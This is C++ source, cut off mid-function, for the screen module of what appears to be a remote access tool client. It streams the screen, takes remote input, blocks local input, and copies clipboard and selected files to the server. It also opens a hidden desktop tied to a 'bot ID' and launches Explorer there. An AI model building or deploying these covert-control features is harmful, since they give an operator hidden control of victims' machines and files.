// ScreenManager.cpp: implementation of the CScreenManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenManager.h"
#include "Common.h"
#include <IOSTREAM>
#if _MSC_VER <= 1200
#include <Winable.h>
#else
#include <WinUser.h>
#endif
#include <time.h>

#include "ScreenSpy.h"
#include "ScreenCapturerDXGI.h"
#include <Shlwapi.h>
#include <shlobj.h>
#include "common/file_upload.h"
#include <thread>
#include "ClientDll.h"
#include <common/iniFile.h>
#include "KernelManager.h"

#pragma comment(lib, "Shlwapi.lib")

#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "FileUpload_Libx64d.lib")
#else
#pragma comment(lib, "FileUpload_Libx64.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "FileUpload_Libd.lib")
#else
#pragma comment(lib, "FileUpload_Lib.lib")
#endif
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define WM_MOUSEWHEEL 0x020A
#define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))

bool IsWindows8orHigher()
{
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (!hMod) return false;

    RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
    if (!rtlGetVersion) return false;

    RTL_OSVERSIONINFOW rovi = { 0 };
    rovi.dwOSVersionInfoSize = sizeof(rovi);
    if (rtlGetVersion(&rovi) == 0) {
        return (rovi.dwMajorVersion > 6) || (rovi.dwMajorVersion == 6 && rovi.dwMinorVersion >= 2);
    }
    return false;
}

CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
#ifndef PLUGIN
    extern ClientApp g_MyApp;
    m_conn = g_MyApp.g_Connection;
    CKernelManager* main = (CKernelManager*)ClientObject->GetMain();
    InitFileUpload({}, main ? main->m_LoginMsg : "", main ? main->m_LoginSignature : "", 64, 50, Logf);
#endif
    m_isGDI = TRUE;
    m_virtual = FALSE;
    m_bIsWorking = TRUE;
    m_bIsBlockInput = FALSE;
    g_hDesk = nullptr;
    m_DesktopID = GetBotId();
    m_ScreenSpyObject = nullptr;
    m_ptrUser = (INT_PTR)user;

    m_point = {};
    m_lastPoint = {};
    m_lmouseDown = FALSE;
    m_hResMoveWindow = nullptr;
    m_resMoveType = 0;
    m_rmouseDown = FALSE;
    m_rclickPoint = {};
    m_rclickWnd = nullptr;
    iniFile cfg(CLIENT_PATH);
    int m_nMaxFPS = cfg.GetInt("settings", "ScreenMaxFPS", 20);
    m_nMaxFPS = max(m_nMaxFPS, 1);
    int threadNum = cfg.GetInt("settings", "ScreenCompressThread", 0);
    m_ClientObject->SetMultiThreadCompress(threadNum);

    m_ScreenSettings.MaxFPS = m_nMaxFPS;
    m_ScreenSettings.CompressThread = threadNum;
    m_ScreenSettings.ScreenStrategy = cfg.GetInt("settings", "ScreenStrategy", 0);
    m_ScreenSettings.ScreenWidth = cfg.GetInt("settings", "ScreenWidth", 0);
    m_ScreenSettings.ScreenHeight = cfg.GetInt("settings", "ScreenHeight", 0);
    m_ScreenSettings.FullScreen = cfg.GetInt("settings", "FullScreen", 0);
    m_ScreenSettings.RemoteCursor = cfg.GetInt("settings", "RemoteCursor", 0);
    m_ScreenSettings.ScrollDetectInterval = cfg.GetInt("settings", "ScrollDetectInterval", 2);  // 默认每2帧
    m_ScreenSettings.QualityLevel = cfg.GetInt("settings", "QualityLevel", QUALITY_ADAPTIVE);  // 默认自适应
    m_ScreenSettings.CpuSpeedup = cfg.GetInt("settings", "CpuSpeedup", 0);

    LoadQualityProfiles();  // 加载质量配置

    m_hWorkThread = __CreateThread(NULL,0, WorkThreadProc,this,0,NULL);
}

bool CScreenManager::SwitchScreen()
{
    if (m_ScreenSpyObject == NULL || m_ScreenSpyObject->GetScreenCount() <= 1 ||
        !m_ScreenSpyObject->IsMultiScreenEnabled())
        return false;
    return RestartScreen();
}

bool CScreenManager::RestartScreen()
{
    if (m_ScreenSpyObject == NULL || m_bIsWorking == FALSE)
        return false;

    // 1. 停止工作线程
    m_bIsWorking = FALSE;
    DWORD s = WaitForSingleObject(m_hWorkThread, 3000);
    if (s == WAIT_TIMEOUT) {
        TerminateThread(m_hWorkThread, -1);
    }

    // 2. 删除旧的截屏对象
    SAFE_DELETE(m_ScreenSpyObject);

    // 3. 重新启动工作线程（InitScreenSpy 会创建新对象）
    m_bIsWorking = TRUE;
    m_SendFirst = FALSE;
    m_hWorkThread = __CreateThread(NULL, 0, WorkThreadProc, this, 0, NULL);
    return true;
}

std::wstring ConvertToWString(const std::string& multiByteStr)
{
    int len = MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, NULL, 0);
    if (len == 0) return L""; // 转换失败

    std::wstring wideStr(len, L'\0');
    MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, &wideStr[0], len);

    return wideStr;
}

bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
{
    bool bReturn = false;

    try {
        if (!pszApplicationFilePath || !pszDesktopName || !strlen(pszApplicationFilePath) || !strlen(pszDesktopName))
            return false;

        TCHAR szDirectoryName[MAX_PATH * 2] = { 0 };
        TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };

        strcpy_s(szDirectoryName, sizeof(szDirectoryName), pszApplicationFilePath);

        std::wstring path = ConvertToWString(pszApplicationFilePath);
        if (!PathIsExe(path.c_str()))
            return false;
        PathRemoveFileSpec(szDirectoryName);
        STARTUPINFO sInfo = { 0 };
        PROCESS_INFORMATION pInfo = { 0 };

        sInfo.cb = sizeof(sInfo);
        sInfo.lpDesktop = pszDesktopName;

        //Launching a application into desktop
        SetLastError(0);
        BOOL bCreateProcessReturn = CreateProcess(pszApplicationFilePath,
                                    NULL,
                                    NULL,
                                    NULL,
                                    TRUE,
                                    NORMAL_PRIORITY_CLASS,
                                    NULL,
                                    szDirectoryName,
                                    &sInfo,
                                    &pInfo);
        DWORD err = GetLastError();
        SAFE_CLOSE_HANDLE(pInfo.hProcess);
        SAFE_CLOSE_HANDLE(pInfo.hThread);
        TCHAR* pszError = NULL;
        FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                      NULL, err, 0, reinterpret_cast<LPTSTR>(&pszError), 0, NULL);

        if (pszError) {
            Mprintf("CreateProcess [%s] %s: %s\n", pszApplicationFilePath, err ? "failed" : "succeed", pszError);
            LocalFree(pszError);  // 释放内存
        }

        if (bCreateProcessReturn)
            bReturn = true;

    } catch (...) {
        bReturn = false;
    }

    return bReturn;
}

// 检查指定桌面（hDesk）中是否存在目标进程（targetExeName）
BOOL IsProcessRunningInDesktop(HDESK hDesk, const char* targetExeName)
{
    // 切换到目标桌面
    if (!SetThreadDesktop(hDesk)) {
        return FALSE;
    }

    // 枚举目标桌面的所有窗口
    BOOL bFound = FALSE;
    std::pair<const char*, BOOL*> data(targetExeName, &bFound);
    EnumDesktopWindows(hDesk, [](HWND hWnd, LPARAM lParam) -> BOOL {
        auto pData = reinterpret_cast<std::pair<const char*, BOOL*>*>(lParam);

        DWORD dwProcessId;
        GetWindowThreadProcessId(hWnd, &dwProcessId);

        // 获取进程名
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
        if (hProcess)
        {
            char exePath[MAX_PATH];
            DWORD size = MAX_PATH;
            if (QueryFullProcessImageName(hProcess, 0, exePath, &size)) {
                if (_stricmp(exePath, pData->first) == 0) {
                    *(pData->second) = TRUE;
                    return FALSE; // 终止枚举
                }
            }
            SAFE_CLOSE_HANDLE(hProcess);
        }
        return TRUE; // 继续枚举
    }, reinterpret_cast<LPARAM>(&data));

    return bFound;
}

void CScreenManager::InitScreenSpy()
{
    int DXGI = USING_GDI;
    BYTE algo = ALGORITHM_DIFF;
    BYTE* user = (BYTE*)m_ptrUser;
    BOOL all = FALSE;
    if (!(user == NULL || ((int)user) == 1)) {
        UserParam* param = (UserParam*)user;
        if (param) {
            DXGI = param->buffer[0];
            algo = param->length > 1 ? param->buffer[1] : algo;
            all = param->length > 2 ? param->buffer[2] : all;
        }
        m_pUserParam = param;
    } else {
        DXGI = (int)user;
    }
    // 如果已设置质量等级，使用对应的算法（优先于启动参数）
    int level = m_ScreenSettings.QualityLevel;
    if (level >= 0 && level < QUALITY_COUNT) {
        algo = m_QualityProfiles[level].algorithm;
    }
    Mprintf("CScreenManager: Type %d Algorithm: %d (QualityLevel=%d)\n", DXGI, int(algo), level);
    if (DXGI == USING_VIRTUAL) {
        m_virtual = TRUE;
        HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
        if (!hDesk) {
            hDesk = CreateDesktop(m_DesktopID.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
            Mprintf("创建虚拟屏幕%s: %s\n", m_DesktopID.c_str(), hDesk ? "成功" : "失败");
        } else {
            Mprintf("打开虚拟屏幕成功: %s\n", m_DesktopID.c_str());
        }
        if (hDesk) {
            TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
            GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
            strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
            if (!IsProcessRunningInDesktop(hDesk, szExplorerFile)) {
                if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
                    Mprintf("启动资源管理器失败[%s]!!!\n", m_DesktopID.c_str());
                }
            } else {
                Mprintf("虚拟屏幕的资源管理器已在运行[%s].\n", m_DesktopID.c_str());
            }
            SetThreadDesktop(g_hDesk = hDesk);
        }
    } else {
        HDESK hDesk = OpenActiveDesktop();
        if (hDesk) {
            SetThreadDesktop(g_hDesk = hDesk);
        }
    }
    SAFE_DELETE(m_ScreenSpyObject);
    if ((USING_DXGI == DXGI && IsWindows8orHigher())) {
        m_isGDI = FALSE;
        auto s = new ScreenCapturerDXGI(algo, DEFAULT_GOP, all);
        if (s->IsInitSucceed()) {
            m_ScreenSpyObject = s;
        } else {
            SAFE_DELETE(s);
            m_isGDI = TRUE;
            m_ScreenSpyObject = new CScreenSpy(32, algo, FALSE, DEFAULT_GOP, all);
            Mprintf("CScreenManager: DXGI SPY init failed!!! Using GDI instead.\n");
        }
    } else {
        m_isGDI = TRUE;
        m_ScreenSpyObject = new CScreenSpy(32, algo, DXGI == USING_VIRTUAL, DEFAULT_GOP, all);
    }
}

BOOL IsRunningAsSystem()
{
    HANDLE hToken;
    PTOKEN_USER pTokenUser = NULL;
    DWORD dwSize = 0;
    BOOL isSystem = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    pTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser,
                                          dwSize, &dwSize)) {
        // 使用 WellKnownSid 创建 SYSTEM SID
        BYTE systemSid[SECURITY_MAX_SID_SIZE];
        DWORD sidSize = sizeof(systemSid);

        if (CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &sidSize)) {
            isSystem = EqualSid(pTokenUser->User.Sid, systemSid);
            if (isSystem) {
                Mprintf("当前进程以 SYSTEM 身份运行。\n");
            } else {
                Mprintf("当前进程未以 SYSTEM 身份运行。\n");
            }
        }
    }

    free(pTokenUser);
    CloseHandle(hToken);
    return isSystem;
}

BOOL CScreenManager::OnReconnect()
{
    auto duration = GetTickCount64() - m_nReconnectTime;
    if (duration <= 3000)
        Sleep(3000 - duration);
    m_nReconnectTime = GetTickCount64();

    m_SendFirst = FALSE;
    BOOL r = m_ClientObject ? m_ClientObject->Reconnect(this) : FALSE;
    Mprintf("CScreenManager OnReconnect '%s'\n", r ? "succeed" : "failed");
    return r;
}

DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
{
    CScreenManager *This = (CScreenManager *)lParam;

    This->InitScreenSpy();

    This->SendBitMapInfo(); //发送bmp位图结构

    // 等控制端对话框打开
    This->WaitForDialogOpen();

    clock_t last = clock();
#if USING_ZLIB
    const int fps = 8;// 帧率
#else
    const int fps = 8;// 帧率
#endif
    const int sleep = 1000 / fps;// 间隔时间（ms）
    int c1 = 0; // 连续耗时长的次数
    int c2 = 0; // 连续耗时短的次数
    float s0 = sleep; // 两帧之间隔（ms）
    const int frames = fps;	// 每秒调整屏幕发送速度
    const float alpha = 1.03; // 控制fps的因子
    clock_t last_check = clock();
    timeBeginPeriod(1);
    while (This->m_bIsWorking) {
        WAIT_n(This->m_bIsWorking && !This->IsConnected(), 6, 200);
        if (!This->IsConnected()) This->OnReconnect();
        if (!This->IsConnected()) continue;
        if (!This->m_SendFirst && This->IsConnected()) {
            This->m_SendFirst = TRUE;
            This->SendBitMapInfo();
            Sleep(50);
            This->SendFirstScreen();
        }
        // 降低桌面检查频率，避免频繁的DC重置导致闪屏
        if (This->IsRunAsService() && !This->m_virtual) {
            auto now = clock();
            if (now - last_check > 500) {
                last_check = now;
                // 使用公共函数检查并切换桌面（无需写权限）
                if (SwitchToDesktopIfChanged(This->g_hDesk, 0) && This->m_isGDI) {
                    // 桌面变化时重置屏幕捕获的DC
                    CScreenSpy* spy = (CScreenSpy*)(This->m_ScreenSpyObject);
                    if (spy) {
                        spy->ResetDesktopDC();
                    }
                }
            }
        }

        ULONG ulNextSendLength = 0;
        const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
        if (szBuffer) {
            s0 = max(s0, 1000./This->m_ScreenSettings.MaxFPS); // 最快每秒20帧
            s0 = min(s0, 1000);
            int span = s0-(clock() - last);
            Sleep(span > 0 ? span : 1);
            if (span < 0) { // 发送数据耗时较长，网络较差或数据较多
                c2 = 0;
                if (frames == ++c1) { // 连续一定次数耗时长
                    s0 = (s0 <= sleep*4) ? s0*alpha : s0;
                    c1 = 0;
#if _DEBUG
                    if (1000./s0>1.0)
                        Mprintf("[+]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
#endif
                }
            } else if (span > 0) { // 发送数据耗时比s0短，表示网络较好或数据包较小
                c1 = 0;
                if (frames == ++c2) { // 连续一定次数耗时短
                    s0 = (s0 >= sleep/4) ? s0/alpha : s0;
                    c2 = 0;
#if _DEBUG
                    if (1000./s0<This->m_ScreenSettings.MaxFPS)
                        Mprintf("[-]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
#endif
                }
            }
            last = clock();
            This->SendNextScreen(szBuffer, ulNextSendLength);
        }
    }
    timeEndPeriod(1);
    Mprintf("ScreenWorkThread Exit\n");

    return 0;
}

VOID CScreenManager::SendBitMapInfo()
{
    //这里得到bmp结构的大小
    const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER) + 2 * sizeof(uint64_t) + sizeof(ScreenSettings);
    LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL, ulLength, MEM_COMMIT, PAGE_READWRITE);
    if (szBuffer == NULL)
        return;
    szBuffer[0] = TOKEN_BITMAPINFO;
    //这里将bmp位图结构发送出去
    memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), sizeof(BITMAPINFOHEADER));
    memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER), &m_conn->clientID, sizeof(uint64_t));
    memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER) + sizeof(uint64_t), &m_DlgID, sizeof(uint64_t));
    memcpy(szBuffer + 1 + sizeof(BITMAPINFOHEADER) + 2 * sizeof(uint64_t), &m_ScreenSettings, sizeof(ScreenSettings));
    m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
    VirtualFree(szBuffer, 0, MEM_RELEASE);
}

CScreenManager::~CScreenManager()
{
    Mprintf("ScreenManager 析构函数\n");
    UninitFileUpload();
    m_bIsWorking = FALSE;

    WaitForSingleObject(m_hWorkThread, INFINITE);
    if (m_hWorkThread!=NULL) {
        SAFE_CLOSE_HANDLE(m_hWorkThread);
    }

    delete m_ScreenSpyObject;
    m_ScreenSpyObject = NULL;
    SAFE_DELETE(m_pUserParam);
}

void RunFileReceiver(CScreenManager *mgr, const std::string &folder, const std::string& files)
{
    auto start = time(0);
    Mprintf("Enter thread RunFileReceiver: %d\n", GetCurrentThreadId());
    IOCPClient* pClient = new IOCPClient(mgr->g_bExit, true, MaskTypeNone, mgr->m_conn);
    if (pClient->ConnectServer(mgr->m_ClientObject->ServerIP().c_str(), mgr->m_ClientObject->ServerPort())) {
        pClient->setManagerCallBack(mgr, CManager::DataProcess, CManager::ReconnectProcess);
        // 发送目录并准备接收文件
        int len = 1 + folder.length() + files.length() + 1;
        char* cmd = new char[len];
        cmd[0] = COMMAND_GET_FILE;
        memcpy(cmd + 1, folder.c_str(), folder.length());
        cmd[1 + folder.length()] = 0;
        memcpy(cmd + 1 + folder.length() + 1, files.data(), files.length());
        cmd[1 + folder.length() + files.length()] = 0;
        pClient->Send2Server(cmd, len);
        SAFE_DELETE_ARRAY(cmd);
        pClient->RunEventLoop(TRUE);
    }
    delete pClient;
    Mprintf("Leave thread RunFileReceiver: %d. Cost: %d s\n", GetCurrentThreadId(), time(0)-start);
}

bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
{
    IOCPClient* pClient = (IOCPClient*)user;
    if (!pClient->IsConnected() || !pClient->Send2Server((char*)data, size)) {
        return false;
    }
    return true;
}

void RecvData(void* ptr)
{
    FileChunkPacket* pkt = (FileChunkPacket*)ptr;
}

void delay_destroy(IOCPClient* pClient, int sec)
{
    if (!pClient) return;
    Sleep(sec * 1000);
    delete pClient;
}

void FinishSend(void* user)
{
    IOCPClient* pClient = (IOCPClient*)user;
    std::thread(delay_destroy, pClient, 15).detach();
}

VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
    switch(szBuffer[0]) {
    case COMMAND_BYE: {
        Mprintf("[CScreenManager] Received BYE: %s\n", ToPekingTimeAsString(0).c_str());
        m_bIsWorking = FALSE;
        m_ClientObject->StopRunning();
        break;
    }
    case COMMAND_SWITCH_SCREEN: {
        SwitchScreen();
        break;
    }
    case CMD_FULL_SCREEN: {
        int fullScreen = szBuffer[1];
        iniFile cfg(CLIENT_PATH);
        cfg.SetInt("settings", "FullScreen", fullScreen);
        m_ScreenSettings.FullScreen = fullScreen;
        break;
    }
    case CMD_REMOTE_CURSOR: {
        int remoteCursor = szBuffer[1];
        iniFile cfg(CLIENT_PATH);
        cfg.SetInt("settings", "RemoteCursor", remoteCursor);
        m_ScreenSettings.RemoteCursor = remoteCursor;
        break;
    }
    case CMD_MULTITHREAD_COMPRESS: {
        int threadNum = szBuffer[1];
        m_ClientObject->SetMultiThreadCompress(threadNum);
        iniFile cfg(CLIENT_PATH);
        cfg.SetInt("settings", "ScreenCompressThread", threadNum);
        m_ScreenSettings.CompressThread = threadNum;
        break;
    }
    case CMD_SCREEN_SIZE: {
        int maxWidth = 0, height = 0, strategy = szBuffer[1];
        memcpy(&maxWidth, szBuffer + 2, 4);
        memcpy(&height, szBuffer + 6, 4);
        Mprintf("收到 CMD_SCREEN_SIZE: strategy=%d, maxWidth=%d, height=%d\n", strategy, maxWidth, height);

        iniFile cfg(CLIENT_PATH);

        // strategy=2 是自适应质量使用的临时策略，不覆盖用户的原始 ScreenStrategy
        if (strategy == 2) {
            if (maxWidth == 0) {
                // maxWidth=0 表示"使用默认策略"，读取用户原来的设置
                strategy = cfg.GetInt("settings", "ScreenStrategy", 0);
                // ScreenStrategy 只能是 0 或 1，如果是其他值则回退到 0
                if (strategy != 0 && strategy != 1) {
                    strategy = 0;
                    cfg.SetInt("settings", "ScreenStrategy", 0);  // 修复无效值
                }
                Mprintf("maxWidth=0, 回退到默认策略: strategy=%d\n", strategy);
            }
            // 保存自适应的 ScreenWidth，下次启动时作为初始值
            cfg.SetInt("settings", "ScreenWidth", maxWidth);
            Mprintf("写入配置: ScreenWidth=%d (保留原 ScreenStrategy)\n", maxWidth);
        } else {
            // strategy=0 或 1 是用户手动设置，写入配置
            cfg.SetInt("settings", "ScreenStrategy", strategy);
            cfg.SetInt("settings", "ScreenWidth", 0);  // 清除自定义 maxWidth
            Mprintf("写入配置: ScreenStrategy=%d, ScreenWidth=0\n", strategy);
        }
        cfg.SetInt("settings", "ScreenHeight", height);

        bool needRestart = false;
        if (m_ScreenSpyObject && m_ScreenSpyObject->GetBIData()) {
            int currentWidth = m_ScreenSpyObject->GetCurrentWidth();
            int fullWidth = m_ScreenSpyObject->GetScreenWidth();
            Mprintf("当前宽度: %d, 原始宽度: %d\n", currentWidth, fullWidth);
            switch (strategy) {
            case 0:  // 1080p
            {
                // 当前分辨率与目标 1080p 限制不同时需要重启
                int target1080Width = min(1920, fullWidth);
                needRestart = (currentWidth != target1080Width);
                Mprintf("strategy=0 (1080p), target=%d, needRestart=%d\n", target1080Width, needRestart);
                break;
            }
            case 1:  // 原始
                needRestart = !m_ScreenSpyObject->IsOriginalSize();
                Mprintf("strategy=1 (原始), needRestart=%d\n", needRestart);
                break;
            case 2:  // 自适应质量调整 (maxWidth > 0，maxWidth=0 时已回退到 case 0/1)
                needRestart = (maxWidth != currentWidth);
                Mprintf("strategy=2 (自适应), maxWidth=%d, currentWidth=%d, needRestart=%d\n",
                        maxWidth, currentWidth, needRestart);
                break;
            }
        } else {
            // 截屏对象不存在或未初始化，直接根据 strategy 决定是否重启
            needRestart = (strategy == 2 && maxWidth > 0);
            Mprintf("截屏对象未就绪, needRestart=%d\n", needRestart);
        }

        if (needRestart) {
            Mprintf("重启截屏...\n");
            RestartScreen();
        } else {
            Mprintf("不需要重启截屏\n");
        }

        m_ScreenSettings.ScreenStrategy = strategy;
        m_ScreenSettings.ScreenWidth = maxWidth;
        m_ScreenSettings.ScreenHeight = height;
        break;
    }
    case CMD_FPS: {
        int m_nMaxFPS = min(255, unsigned(szBuffer[1]));
        m_nMaxFPS = max(m_nMaxFPS, 1);
        iniFile cfg(CLIENT_PATH);
        cfg.SetInt("settings", "ScreenMaxFPS", m_nMaxFPS);
        m_ScreenSettings.MaxFPS = m_nMaxFPS;
        break;
    }
    case CMD_SCROLL_INTERVAL: {
        // 实时更新滚动检测间隔并保存
        int interval = *(int*)(szBuffer + 1);
        if (m_ScreenSpyObject) {
            m_ScreenSpyObject->SetScrollDetectInterval(interval);
            Mprintf("滚动检测间隔更新: %d\n", interval);
        }
        m_ScreenSettings.ScrollDetectInterval = interval;
        iniFile cfg(CLIENT_PATH);
        cfg.SetInt("settings", "ScrollDetectInterval", interval);
        break;
    }
    case CMD_QUALITY_LEVEL: {
        // 质量等级调整 (level: -2=关闭, -1=自适应, 0-5=具体等级)
        int8_t level = (int8_t)szBuffer[1];  // 有符号，支持负值
        int persist = ulLength >= 3 ? szBuffer[2] : 0;  // 是否保存到配置
        m_ScreenSettings.QualityLevel = level;
        // 保存到配置
        if (persist) {
            iniFile cfg(CLIENT_PATH);
            cfg.SetInt("settings", "QualityLevel", level);
        }
        // 应用具体等级的配置
        if (level == QUALITY_DISABLED) {
            // 关闭模式：不修改任何设置，使用原有的算法和帧率配置
            Mprintf("质量等级: 关闭 (使用原有设置)\n");
        } else if (level >= 0 && level < QUALITY_COUNT) {
            // 具体等级：应用本地配置
            const QualityProfile& profile = m_QualityProfiles[level];
            m_ScreenSettings.MaxFPS = profile.maxFPS;
            bool needRestart = false;
            if (m_ScreenSpyObject) {
                // 如果当前是 H264 且码率变化，需要重启以重新创建编码器
                bool isH264 = (m_ScreenSpyObject->GetAlgorithm() == ALGORITHM_H264);
                bool bitRateChanged = m_ScreenSpyObject->SetBitRate(profile.bitRate);
                if (isH264 && bitRateChanged) {
                    needRestart = true;
                }
                m_ScreenSpyObject->SetAlgorithm(profile.algorithm);
            }
            Mprintf("质量等级: Level=%d, FPS=%d, Algo=%d, BitRate=%d\n", level, 
                profile.maxFPS, profile.algorithm, profile.bitRate);
            if (needRestart) {
                Mprintf("H264 码率变化，重启截屏...\n");
                RestartScreen();
            }
        } else {
            // 自适应模式：由服务端动态调整
            Mprintf("质量等级: 自适应模式\n");
        }
        break;
    }
    case CMD_INSTRUCTION_SET: {
        int set = unsigned(szBuffer[1]);
        iniFile cfg(CLIENT_PATH);
        cfg.SetInt("settings", "CpuSpeedup", set);
        if (m_ScreenSettings.CpuSpeedup != set)
            RestartScreen();
        m_ScreenSettings.CpuSpeedup = set;
        Mprintf("使用的CPU加速指令集: %d\n", set);
        break;
    }
    case CMD_QUALITY_PROFILES: {
        // 接收服务端下发的质量配置
        if (ulLength >= 1 + sizeof(QualityProfile) * QUALITY_COUNT) {
            memcpy(m_QualityProfiles, szBuffer + 1, sizeof(QualityProfile) * QUALITY_COUNT);
            SaveQualityProfiles();
            Mprintf("收到质量配置更新\n");
        }
        break;
    }
    case COMMAND_NEXT: {
        m_DlgID = ulLength >= 9 ? *((uint64_t*)(szBuffer + 1)) : 0;
        // 解析服务端能力标志（如果有）
        if (ulLength >= 9 + sizeof(uint32_t)) {
            uint32_t capabilities = *(uint32_t*)(szBuffer + 9);
            if (m_ScreenSpyObject) {
                m_ScreenSpyObject->SetServerCapabilities(capabilities);
                if (capabilities & CAP_SCROLL_DETECT) {
                    m_ScreenSpyObject->EnableScrollDetection(true);
                    Mprintf("滚动检测已启用 (服务端支持)\n");
                }
            }
        }
        // 解析滚动检测间隔（优先使用服务端发送的值，否则使用本地保存的值）
        if (ulLength >= 9 + sizeof(uint32_t) + sizeof(int)) {
            int scrollInterval = *(int*)(szBuffer + 9 + sizeof(uint32_t));
            if (m_ScreenSpyObject) {
                m_ScreenSpyObject->SetScrollDetectInterval(scrollInterval);
                Mprintf("滚动检测间隔(服务端): %d\n", scrollInterval);
            }
        } else if (m_ScreenSpyObject && m_ScreenSettings.ScrollDetectInterval > 0) {
            // 使用本地保存的间隔设置
            m_ScreenSpyObject->SetScrollDetectInterval(m_ScreenSettings.ScrollDetectInterval);
            Mprintf("滚动检测间隔(本地): %d\n", m_ScreenSettings.ScrollDetectInterval);
        }
        NotifyDialogIsOpen();
        break;
    }
    case COMMAND_SCREEN_CONTROL: {
        if (m_ScreenSpyObject == NULL) break;
        BlockInput(false);
        ProcessCommand(szBuffer + 1, ulLength - 1);
        BlockInput(m_bIsBlockInput);  //再恢复成用户的设置

        break;
    }
    case COMMAND_SCREEN_BLOCK_INPUT: { //ControlThread里锁定
        m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //鼠标键盘的锁定

        BlockInput(m_bIsBlockInput);

        break;
    }
    case COMMAND_SCREEN_GET_CLIPBOARD: {
        int result = 0;
        auto files = GetClipboardFiles(result);
        if (!files.empty()) {
            char h[100] = {};
            memcpy(h, szBuffer + 1, ulLength - 1);
            m_hash = std::string(h, h + 64);
            m_hmac = std::string(h + 64, h + 80);
            auto str = BuildMultiStringPath(files);
            BYTE* szBuffer = new BYTE[1 + str.size()];
            szBuffer[0] = { COMMAND_GET_FOLDER };
            memcpy(szBuffer + 1, str.data(), str.size());
            SendData(szBuffer, 1 + str.size());
            SAFE_DELETE_ARRAY(szBuffer);
            break;
        }
        if (SendClientClipboard(ulLength > 1))
            break;
        files = GetForegroundSelectedFiles(result);
        if (!files.empty()) {
            char h[100] = {};
            memcpy(h, szBuffer + 1, ulLength - 1);
            m_hash = std::string(h, h + 64);
            m_hmac = std::string(h + 64, h + 80);
            auto str = BuildMultiStringPath(files);
            BYTE* szBuffer = new BYTE[1 + str.size()];
            szBuffer[0] = { COMMAND_GET_FOLDER };
            memcpy(szBuffer + 1, str.data(), str.size());
            SendData(szBuffer, 1 + str.size());
            SAFE_DELETE_ARRAY(szBuffer);
        }
        break;
    }
    case COMMAND_SCREEN_SET_CLIPBOARD: {
        UpdateClientClipboard((char*)szBuffer + 1, ulLength - 1);
        break;
    }
    case COMMAND_GET_FOLDER: {
        std::string folder;
        if ((GetCurrentFolderPath(folder) || IsDebug) && ulLength - 1 > 80) {
            char *h = new char[ulLength-1];
            memcpy(h, szBuffer + 1, ulLength - 1);
            m_hash = std::string(h, h + 64);
            m_hmac = std::string(h + 64, h + 80);
            std::string files = h[80] ? std::string(h + 80, h + ulLength - 1) : "";
            SAFE_DELETE_ARRAY(h);
            if (OpenClipboard(nullptr)) {
                EmptyClipboard();
                CloseClipboard();
            }
            std::thread(RunFileReceiver, this, folder, files).detach();
        }
        break;
    }
    case COMMAND_GET_FILE: {
        // 发送文件
        std::string dir = (char*)(szBuffer + 1);
        char* ptr = (char*)szBuffer + 1 + dir.length() + 1;
        auto files = *ptr ? ParseMultiStringPath(ptr, ulLength - 2 - dir.length()) : std::vector<std::string> {};
        if (files.empty()) {
            BOOL result = 0;
            files = GetClipboardFiles(result);
        }
        if (!files.empty() && !dir.empty()) {
            IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
            if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
                std::thread(FileBatchTransferWorker, files, dir, pClient, ::SendData, ::FinishSend,
                            m_hash, m_hmac).detach();
            } else {
                delete pClient;
            }
        }
        break;
    }
    case COMMAND_SEND_FILE: {
        // 接收文件
        int n = RecvFileChunk((char*)szBuffer, ulLength, m_conn, RecvData, m_hash, m_hmac);
        if (n) {
            Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, m_hash.c_str(), m_hmac.c_str());
        }
        break;
    }
    }
}


VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
{
    if (!::OpenClipboard(NULL))
        return;
